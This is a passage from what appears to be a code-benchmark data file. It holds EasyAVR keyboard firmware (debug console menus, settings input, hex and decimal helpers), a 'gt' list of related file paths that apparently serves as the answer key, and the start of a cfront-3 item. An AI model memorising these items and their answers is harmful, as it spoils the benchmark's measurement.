NUMBER_OF_SCHEDULE_SLOTS;\n\t\t\t\tif (i == 0)\n\t\t\t\t\tword_print[0] = '\\n';\n\t\t\t\telse\n\t\t\t\t\tword_print[0] = ' ';\n\t\t\t\tqueue_ram_autotext(word_print, 1);\n\t\t\t\tword_to_str(g_schedule_clocks[i][j], word_print);\n\t\t\t\tqueue_ram_autotext(word_print, sizeof(word_print));\n\t\t\t\tg_console_index++;\n\t\t\t}\n\t\t\tbreak;\n#endif\n\n\t\tcase CONSOLE_MENU_CONFIG:\n\t\t\tswitch (g_console_index)\n\t\t\t{\n\t\t\tcase 0:\n\t\t\t\tqueue_autotext(g_config_menu_begin);\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tqueue_autotext(g_menu_1);\n\t\t\t\tqueue_autotext(g_vnumpad_desc);\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tif (g_virtual_numlock)\n\t\t\t\t\tqueue_autotext(g_on_print);\n\t\t\t\telse\n\t\t\t\t\tqueue_autotext(g_off_print);\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tqueue_autotext(g_menu_2);\n\t\t\t\tqueue_autotext(g_vwinlock_desc);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tif (g_winlock_on_scrolllock)\n\t\t\t\t\tqueue_autotext(g_on_print);\n\t\t\t\telse\n\t\t\t\t\tqueue_autotext(g_off_print);\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tqueue_autotext(g_menu_3);\n\t\t\t\tqueue_autotext(g_deflayer_desc);\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\tword_print[0] = ':';\n\t\t\t\tword_print[1] = ' ';\n\t\t\t\tdec_to_string(g_default_layer, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 3);\n\t\t\t\tbreak;\n\t\t\tcase 7:\n\t\t\t\tqueue_autotext(g_menu_4);\n\t\t\t\tqueue_autotext(g_bootkb_desc);\n\t\t\t\tbreak;\n\t\t\tcase 8:\n\t\t\t\tif (g_boot_keyboard_only)\n\t\t\t\t\tqueue_autotext(g_on_print);\n\t\t\t\telse\n\t\t\t\t\tqueue_autotext(g_off_print);\n\t\t\t\tbreak;\n\t\t\tcase 9:\n\t\t\t\tqueue_autotext(g_menu_5);\n\t\t\t\tqueue_autotext(g_vnumlock_desc);\n\t\t\t\tbreak;\n\t\t\tcase 10:\n\t\t\t\tif (g_virtual_numlock)\n\t\t\t\t\tqueue_autotext(g_on_print);\n\t\t\t\telse\n\t\t\t\t\tqueue_autotext(g_off_print);\n\t\t\t\tbreak;\n\t\t\tcase 11:\n\t\t\t\tqueue_autotext(g_menu_6);\n\t\t\t\tqueue_autotext(g_dbstyle_desc);\n\t\t\t\tbreak;\n\t\t\tcase 12:\n\t\t\t\tif (g_debounce_style)\n\t\t\t\t\tqueue_autotext(g_on_print);\n\t\t\t\telse\n\t\t\t\t\tqueue_autotext(g_off_print);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tqueue_autotext(g_menu_end);\n\t\t\t\tbegin_read();\n\t\t\t\tg_console_state = CONSOLE_PROCESS_CONFIG;\n\t\t\t}\n\t\t\tg_console_index++;\n\t\t\tbreak;\n\t\tcase CONSOLE_PROCESS_CONFIG:\n\t\t\tg_console_state = CONSOLE_PROMPT_CONFIG;\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tg_console_index = read_byte;\n\t\t\tif (read_byte == 9)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_MAIN;\n\t\t\t}\n\t\t\telse if (read_byte == 1)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_vnumpad_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 2)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_vwinlock_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 3)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_deflayer_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 4)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_bootkb_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 5)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_vnumlock_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 6)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_dbstyle_desc);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_invalid_selection);\n\t\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\t\tg_console_index = 0;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CONSOLE_PROMPT_CONFIG:\n\t\t\tswitch (g_console_index)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t\tqueue_autotext(g_range_bool);\n\t\t\t\tg_console_state = CONSOLE_VNUMPAD;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tqueue_autotext(g_range_bool);\n\t\t\t\tg_console_state = CONSOLE_VWINLOCK;\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tqueue_autotext(g_range_0_9);\n\t\t\t\tg_console_state = CONSOLE_DEFAULTLAYER;\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tqueue_autotext(g_range_bool);\n\t\t\t\tg_console_state = CONSOLE_BOOTKEYBOARD;\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tqueue_autotext(g_range_bool);\n\t\t\t\tg_console_state = CONSOLE_VNUMLOCK;\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\tqueue_autotext(g_range_bool);\n\t\t\t\tg_console_state = CONSOLE_DBSTYLE;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\t}\n\t\t\tbegin_read();\n\t\t\tg_console_index = 0;\n\t\t\tbreak;\n\t\tcase CONSOLE_VNUMPAD:\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte <= 1)\n\t\t\t{\n\t\t\t\tg_swap_num_row_on_numlock = read_byte;\n\t\t\t\tnvm_update_param(NVM_ID_SWAP_NUM_ROW_ON_NUMLOCK);\n\t\t\t} else {\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\tbreak;\n\t\tcase CONSOLE_VWINLOCK:\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte <= 1)\n\t\t\t{\n\t\t\t\tg_winlock_on_scrolllock = read_byte;\n\t\t\t\tnvm_update_param(NVM_ID_WINLOCK_ON_SCROLLLOCK);\n\t\t\t} else {\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\tbreak;\n\t\tcase CONSOLE_DEFAULTLAYER:\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte < NUMBER_OF_LAYERS)\n\t\t\t{\n\t\t\t\tg_default_layer = read_byte;\n\t\t\t\tnvm_update_param(NVM_ID_DEFAULT_LAYER);\n\t\t\t} else {\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\tbreak;\n\t\tcase CONSOLE_BOOTKEYBOARD:\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte <= 1)\n\t\t\t{\n\t\t\t\tg_boot_keyboard_only = read_byte;\n\t\t\t\tnvm_update_param(NVM_ID_BOOT_KEYBOARD_ONLY);\n\t\t\t} else {\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\tbreak;\n\t\tcase CONSOLE_VNUMLOCK:\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte <= 1)\n\t\t\t{\n\t\t\t\tg_virtual_numlock = read_byte;\n\t\t\t\tnvm_update_param(NVM_ID_VIRTUAL_NUMLOCK);\n\t\t\t} else {\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\tbreak;\n\t\tcase CONSOLE_DBSTYLE:\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte <= 1)\n\t\t\t{\n\t\t\t\tg_debounce_style = read_byte;\n\t\t\t\tnvm_update_param(NVM_ID_DEBOUNCE_STYLE);\n\t\t\t\tif (g_debounce_style)\n\t\t\t\t{\n\t\t\t\t\tg_debounce_ms = DEFAULT_ALT_DEBOUNCE_MS;\n\t\t\t\t\tnvm_update_param(NVM_ID_DEBOUNCE_MS);\n\t\t\t\t} else {\n\t\t\t\t\tg_debounce_ms = DEFAULT_DEBOUNCE_MS;\n\t\t\t\t\tnvm_update_param(NVM_ID_DEBOUNCE_MS);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\tbreak;\n\n\t\tcase CONSOLE_MENU_TIMING:\n\t\t\tword_print[0] = ':';\n\t\t\tword_print[1] = ' ';\n\t\t\tswitch (g_console_index)\n\t\t\t{\n\t\t\tcase 0:\n\t\t\t\tqueue_autotext(g_timing_menu_begin);\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tqueue_autotext(g_menu_1);\n\t\t\t\tqueue_autotext(g_debounce_desc);\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tdec_to_string(g_debounce_ms, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 4);\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tqueue_autotext(g_menu_2);\n\t\t\t\tqueue_autotext(g_tap_desc);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tdec_to_string(g_max_tap_ms, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 5);\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tqueue_autotext(g_menu_3);\n\t\t\t\tqueue_autotext(g_doubletap_desc);\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\tdec_to_string(g_doubletap_delay_ms*(-1), word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 5);\n\t\t\t\tbreak;\n\t\t\tcase 7:\n\t\t\t\tqueue_autotext(g_menu_4);\n\t\t\t\tqueue_autotext(g_mousebase_desc);\n\t\t\t\tbreak;\n\t\t\tcase 8:\n\t\t\t\tdec_to_string(g_mouse_min_delta, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 4);\n\t\t\t\tbreak;\n\t\t\tcase 9:\n\t\t\t\tqueue_autotext(g_menu_5);\n\t\t\t\tqueue_autotext(g_mousemult_desc);\n\t\t\t\tbreak;\n\t\t\tcase 10:\n\t\t\t\tdec_to_string(g_mouse_delta_mult, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 4);\n\t\t\t\tbreak;\n\t\t\tcase 11:\n\t\t\t\tqueue_autotext(g_menu_6);\n\t\t\t\tqueue_autotext(g_hold_desc);\n\t\t\t\tbreak;\n\t\t\tcase 12:\n\t\t\t\tdec_to_string(g_hold_key_ms, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 5);\n\t\t\t\tbreak;\n\t\t\tcase 13:\n\t\t\t\tqueue_autotext(g_menu_7);\n\t\t\t\tqueue_autotext(g_repeat_desc);\n\t\t\t\tbreak;\n\t\t\tcase 14:\n\t\t\t\tdec_to_string(g_repeat_ms, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 4);\n\t\t\t\tbreak;\n\t\t\tcase 15:\n\t\t\t\tqueue_autotext(g_menu_8);\n\t\t\t\tqueue_autotext(g_setup_desc);\n\t\t\t\tbreak;\n\t\t\tcase 16:\n\t\t\t\tdec_to_string(g_matrix_setup_wait, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 5);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tqueue_autotext(g_menu_end);\n\t\t\t\tbegin_read();\n\t\t\t\tg_console_state = CONSOLE_PROCESS_TIMING;\n\t\t\t}\n\t\t\tg_console_index++;\n\t\t\tbreak;\n\t\tcase CONSOLE_PROCESS_TIMING:\n\t\t\tg_console_state = CONSOLE_PROMPT_TIMING;\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tg_console_index = read_byte;\n\t\t\tif (read_byte == 9)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_MAIN;\n\t\t\t}\n\t\t\telse if (read_byte == 1)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_debounce_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 2)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_tap_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 3)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_doubletap_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 4)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_mousebase_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 5)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_mousemult_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 6)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_hold_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 7)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_repeat_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 8)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_setup_desc);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_invalid_selection);\n\t\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\t\tg_console_index = 0;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CONSOLE_PROMPT_TIMING:\n\t\t\tswitch (g_console_index)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t\tqueue_autotext(g_range_1_99);\n\t\t\t\tg_console_state = CONSOLE_DEBOUNCE;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tqueue_autotext(g_range_1_999);\n\t\t\t\tg_console_state = CONSOLE_TAP;\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tqueue_autotext(g_range_1_999);\n\t\t\t\tg_console_state = CONSOLE_DOUBLETAP;\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tqueue_autotext(g_range_1_99);\n\t\t\t\tg_console_state = CONSOLE_MOUSEBASE;\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tqueue_autotext(g_range_1_99);\n\t\t\t\tg_console_state = CONSOLE_MOUSEMULT;\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\tqueue_autotext(g_range_1_999);\n\t\t\t\tg_console_state = CONSOLE_HOLD;\n\t\t\t\tbreak;\n\t\t\tcase 7:\n\t\t\t\tqueue_autotext(g_range_1_99);\n\t\t\t\tg_console_state = CONSOLE_REPEAT;\n\t\t\t\tbreak;\n\t\t\tcase 8:\n\t\t\t\tqueue_autotext(g_range_1_255);\n\t\t\t\tg_console_state = CONSOLE_SETUP;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\t}\n\t\t\tbegin_read();\n\t\t\tg_console_index = 0;\n\t\t\tbreak;\n\t\tcase CONSOLE_DEBOUNCE:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word < 100) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_debounce_ms = (uint8_t)(read_word & 0x00FF);\n\t\t\t\tnvm_update_param(NVM_ID_DEBOUNCE_MS);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\t\tcase CONSOLE_TAP:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word < 1000) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_max_tap_ms = read_word;\n\t\t\t\tnvm_update_param(NVM_ID_MAX_TAP_MS);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\t\tcase CONSOLE_DOUBLETAP:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word < 1000) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_doubletap_delay_ms = read_word*(-1);\n\t\t\t\tnvm_update_param(NVM_ID_DOUBLETAP_DELAY_MS);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\t\tcase CONSOLE_MOUSEBASE:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word < 100) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_mouse_min_delta = (uint8_t)(read_word & 0x00FF);\n\t\t\t\tnvm_update_param(NVM_ID_MOUSE_MIN_DELTA);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\t\tcase CONSOLE_MOUSEMULT:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word < 100) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_mouse_delta_mult = (uint8_t)(read_word & 0x00FF);\n\t\t\t\tnvm_update_param(NVM_ID_MOUSE_DELTA_MULT);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\t\tcase CONSOLE_HOLD:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word < 1000) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_hold_key_ms = read_word;\n\t\t\t\tnvm_update_param(NVM_ID_HOLD_KEY_MS);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\t\tcase CONSOLE_REPEAT:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word < 100) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_repeat_ms = (uint8_t)(read_word & 0x00FF);\n\t\t\t\tnvm_update_param(NVM_ID_REPEAT_MS);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\t\tcase CONSOLE_SETUP:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word <= 255) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_matrix_setup_wait = (uint8_t)(read_word & 0x00FF);\n\t\t\t\tnvm_update_param(NVM_ID_MATRIX_SETUP_WAIT);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\tbreak;\n\n\t\tcase CONSOLE_MENU_LED:\n\t\t\tword_print[0] = ':';\n\t\t\tword_print[1] = ' ';\n\t\t\tswitch (g_console_index)\n\t\t\t{\n\t\t\tcase 0:\n\t\t\t\tqueue_autotext(g_led_menu_begin);\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tqueue_autotext(g_menu_1);\n\t\t\t\tqueue_autotext(g_defdim_desc);\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tdec_to_string(g_init_dimmer_level, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 4);\n\t\t\t\tbreak;\n#ifdef MAX_NUMBER_OF_BACKLIGHTS\n\t\t\tcase 3:\n\t\t\t\tqueue_autotext(g_menu_2);\n\t\t\t\tqueue_autotext(g_defblen_desc);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tdec_to_string(g_init_backlight_enable+1, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 4);\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tqueue_autotext(g_menu_3);\n\t\t\t\tqueue_autotext(g_defblmode_desc);\n\t\t\t\tbreak;\n\t\t\tcase 6:\n\t\t\t\tdec_to_string(g_init_backlight_mode+1, word_print+2);\n\t\t\t\tqueue_ram_autotext(word_print, 3);\n\t\t\t\tbreak;\n#endif\n\t\t\tdefault:\n\t\t\t\tqueue_autotext(g_menu_end);\n\t\t\t\tbegin_read();\n\t\t\t\tg_console_state = CONSOLE_PROCESS_LED;\n\t\t\t}\n\t\t\tg_console_index++;\n\t\t\tbreak;\n\t\tcase CONSOLE_PROCESS_LED:\n\t\t\tg_console_state = CONSOLE_PROMPT_LED;\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tg_console_index = read_byte;\n\t\t\tif (read_byte == 9)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_MAIN;\n\t\t\t}\n\t\t\telse if (read_byte == 1)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_defdim_desc);\n\t\t\t}\n#ifdef MAX_NUMBER_OF_BACKLIGHTS\n\t\t\telse if (read_byte == 2)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_defblen_desc);\n\t\t\t}\n\t\t\telse if (read_byte == 3)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_defblmode_desc);\n\t\t\t}\n#endif\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_invalid_selection);\n\t\t\t\tg_console_state = CONSOLE_MENU_LED;\n\t\t\t\tg_console_index = 0;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CONSOLE_PROMPT_LED:\n\t\t\tswitch (g_console_index)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t\tqueue_autotext(g_range_1_16);\n\t\t\t\tg_console_state = CONSOLE_DEFAULTDIMMER;\n\t\t\t\tbreak;\n#ifdef MAX_NUMBER_OF_BACKLIGHTS\n\t\t\tcase 2:\n\t\t\t\tqueue_autotext(g_range_1_16);\n\t\t\t\tg_console_state = CONSOLE_DEFAULTBACKLIGHT;\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tqueue_autotext(g_range_1_4);\n\t\t\t\tg_console_state = CONSOLE_DEFAULTBLMODE;\n\t\t\t\tbreak;\n#endif\n\t\t\tdefault:\n\t\t\t\tg_console_state = CONSOLE_MENU_LED;\n\t\t\t}\n\t\t\tbegin_read();\n\t\t\tg_console_index = 0;\n\t\t\tbreak;\n\t\tcase CONSOLE_DEFAULTDIMMER:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word <= NUMBER_OF_BACKLIGHT_LEVELS) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_init_dimmer_level = (uint8_t)(read_word & 0x00FF);\n\t\t\t\tnvm_update_param(NVM_ID_INIT_DIMMER_LEVEL);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_LED;\n\t\t\tbreak;\n#ifdef MAX_NUMBER_OF_BACKLIGHTS\n\t\tcase CONSOLE_DEFAULTBACKLIGHT:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word <= MAX_BACKLIGHT_ENABLES) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_init_backlight_enable = ((uint8_t)(read_word & 0x00FF)) - 1;\n\t\t\t\tnvm_update_param(NVM_ID_INIT_BACKLIGHT_ENABLE);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_LED;\n\t\t\tbreak;\n\t\tcase CONSOLE_DEFAULTBLMODE:\n\t\t\tread_word = sc_to_word(g_read_buffer, g_read_buffer_length, 10);\n\t\t\tif ((read_word <= NUMBER_OF_BACKLIGHT_MODES) && (read_word > 0))\n\t\t\t{\n\t\t\t\tg_init_backlight_mode = ((uint8_t)(read_word & 0x00FF)) - 1;\n\t\t\t\tnvm_update_param(NVM_ID_INIT_BACKLIGHT_MODE);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_out_of_range);\n\t\t\t}\n\t\t\tg_console_state = CONSOLE_MENU_LED;\n\t\t\tbreak;\n#endif\n\t\t}\n\t}\n}\n\nvoid report_event(uint8_t code, uint16_t status, uint8_t mode)\n{\n#ifdef ENABLE_DEBUG_CONSOLE\n\tuint8_t i;\n\n\tif (mode == MODE_UPDATE)\n\t{\n\t\tfor (i=0; i<g_event_buffer_count; i++)\n\t\t{\n\t\t\tif (g_event_buffer[i].code == code)\n\t\t\t{\n\t\t\t\tg_event_buffer[i].status = status;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (i >= g_event_buffer_count)\n\t\t{\n\t\t\tappend_event(code, status);\n\t\t}\n\t} else {\n\t\tappend_event(code, status);\n\t}\n}\n\nvoid append_event(uint8_t code, uint16_t status)\n{\n\tif (g_event_buffer_count < EVENT_BUFFER_SIZE)\n\t{\n\t\tg_event_buffer[g_event_buffer_count].code = code;\n\t\tg_event_buffer[g_event_buffer_count].status = status;\n\t\tg_event_buffer_count++;\n\t}\n#else\n\t(void)code;\n\t(void)status;\n\t(void)mode;\n#endif\n}\n\nvoid word_to_str(uint16_t w, char* dst)\n{\n\tbyte_to_str((uint8_t)((w & 0xFF00) >> 8), dst);\n\tbyte_to_str((uint8_t)(w & 0x00FF), dst+2);\n}\n\nvoid byte_to_str(uint8_t b, char* dst)\n{\n\tdst[0] = nibble_to_char((b & 0xF0) >> 4);\n\tdst[1] = nibble_to_char(b & 0x0F);\n}\n\nchar nibble_to_char(uint8_t c)\n{\n\treturn (c<10) ? (c+'0') : (c+('A'-10)) ;\n}\n\n\nvoid dec_to_string(uint16_t w, char* dst)\n{\n\tuint8_t i = 0;\n\tuint8_t d = 100;\n\n\tdst[0] = '0';\n\tdst[1] = ' ';\n\tdst[2] = ' ';\n\n\twhile (d > 0)\n\t{\n\t\tif (i || (w >= d))\n\t\t{\n\t\t\tdst[i] = nibble_to_char(w / d);\n\t\t\tw = w % d;\n\t\t\ti++;\n\t\t}\n\t\td = d / 10;\n\t}\n}\n\nuint8_t sc_to_int(uint8_t sc)\n{\n\tif ( (sc >= HID_KEYBOARD_SC_KEYPAD_1_AND_END ) &&\n\t\t (sc <= HID_KEYBOARD_SC_KEYPAD_9_AND_PAGE_UP) )\n\t{\n\t\treturn (sc - 0x58);\n\t}\n\telse if ( (sc >= HID_KEYBOARD_SC_1_AND_EXCLAMATION ) &&\n\t\t\t  (sc <= HID_KEYBOARD_SC_9_AND_OPENING_PARENTHESIS) )\n\t{\n\t\treturn (sc - 0x1D);\n\t}\n\telse if ( (sc >= HID_KEYBOARD_SC_A ) &&\n\t\t\t  (sc <= HID_KEYBOARD_SC_F ) )\n\t{\n\t\treturn (sc + 0x06);\n\t}\n\telse\n\t{\n\t\treturn 0;\n\t}\n}\n\nuint16_t sc_to_word(uint8_t * buf, const size_t length, const uint8_t base)\n{\n\tuint8_t i;\n\tuint16_t val=0;\n\n\tfor (i=0; i<length; i++)\n\t{\n\t\tval = (val * base) + sc_to_int(buf[i]);\n\t}\n\treturn val;\n}\n",
        "gt": [
            "'EasyAVR/firmware/src/config_schedule.h'",
            "'EasyAVR/firmware/src/scheduler.h'",
            "'EasyAVR/firmware/src/debug.c'"
        ]
    },
    {
        "files": [
            "'cfront-3/incl-master/incl-linux32/pwd.h'",
            "'cfront-3/libSC/G2++/g2++lib/getrec.c'",
            "'cfront-3/incl-master/incl-linux32/osfcn.h'"
        ],
        "content": "'cfront-3/incl-master/incl-linux32/pwd.h'\n:\n\n#ifndef FILE\n#       include <stdio.h>\n#endif\n\nstruct passwd {\n\tchar\t*pw_name;\n\tchar\t*pw_passwd;\n\tint\tpw_uid;\n\tint\tpw_gid;\n\tchar\t*pw_age;\n\tchar\t*pw_comment;\n\tchar\t*pw_gecos;\n\tchar\t*pw_dir;\n\tchar\t*pw_shell;\n};\n\nstruct comment {\n\tchar\t*c_dept;\n\tchar\t*c_name;\n\tchar\t*c_acct;\n\tchar\t*c_bin;\n};\n\nextern passwd *getpwent ();\nextern passwd *getpwuid ();\nextern passwd *getpwnam (const char*);\nextern passwd *fgetpwent (FILE*);\n\nextern void setpwent ();\nextern void endpwent ();\nextern int putpwent (const passwd*, FILE*);\n\n'cfront-3/libSC/G2++/g2++lib/getrec.c'\n:\n\n\n#include <g2ctype.h>\n#include <g2debug.h>\n#include <g2io.h>\n#include <g2manip.h>\n#include 